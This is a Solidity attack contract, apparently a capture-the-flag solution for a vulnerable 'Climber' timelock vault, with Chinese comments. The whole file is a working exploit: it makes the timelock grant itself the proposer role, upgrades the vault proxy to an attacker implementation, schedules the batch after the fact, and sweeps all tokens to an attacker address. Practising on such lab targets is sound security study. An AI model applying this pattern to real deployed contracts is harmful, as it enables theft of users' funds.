// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;


import "hardhat/console.sol";
import "@openzeppelin/contracts/utils/Address.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

import "../climber/ClimberTimelock.sol";
import "../climber/ClimberVault.sol";
import "./NewImplClimberVault.sol";

contract ClimberAttack {
    bytes32 public constant PROPOSER_ROLE = keccak256("PROPOSER_ROLE");

    address attackAddress;
    ClimberTimelock climberTimeLock;
    address clmberVaultProxy; 
    address tokenAddress;

    address[] targets = new address[](3);
    uint256[] values = new uint256[](3);
    bytes[] dataElements = new bytes[](3);
    bytes32 salt = keccak256("run()");

    function run(
                address _attackAddress,
                address _climberTimeLockAddress,
                address _clmberVaultProxy,
                address _newImplClimberVault,
                address _tokenAddress) 
                external
    {
        attackAddress = _attackAddress;
        climberTimeLock = ClimberTimelock(payable(_climberTimeLockAddress));
        clmberVaultProxy = _clmberVaultProxy;
        tokenAddress = _tokenAddress;

        //执行授权
        targets[0] = address(climberTimeLock);
        values[0] = 0;
        dataElements[0] = abi.encodeWithSelector(
                                bytes4(keccak256("grantRole(bytes32,address)")), 
                                PROPOSER_ROLE,address(this));

        //执行更新
        targets[1] = clmberVaultProxy;
        values[1] = 0;
        dataElements[1] = abi.encodeWithSelector(
                bytes4(keccak256("upgradeTo(address)")),
                address(_newImplClimberVault));

        //最后执行schedule
        targets[2] = address(this);
        values[2] = 0;
        dataElements[2] = abi.encodeWithSelector(
                                bytes4(keccak256("schedule()")));

        climberTimeLock.execute(targets, values, dataElements, salt);
        //注意这个不要用变量：newImplClimberVault进行调用,要用旧的地址
        NewImplClimberVault(clmberVaultProxy).setNewSweeper(address(this));
        NewImplClimberVault(clmberVaultProxy).sweepFunds(tokenAddress);
        IERC20 token = IERC20(tokenAddress);
        require(token.transfer(attackAddress, token.balanceOf(address(this))), "Transfer to attackAddress failed");
    }

    function schedule() external{
        climberTimeLock.schedule(targets,values,dataElements,salt);
    }

    receive() external payable{}
}
 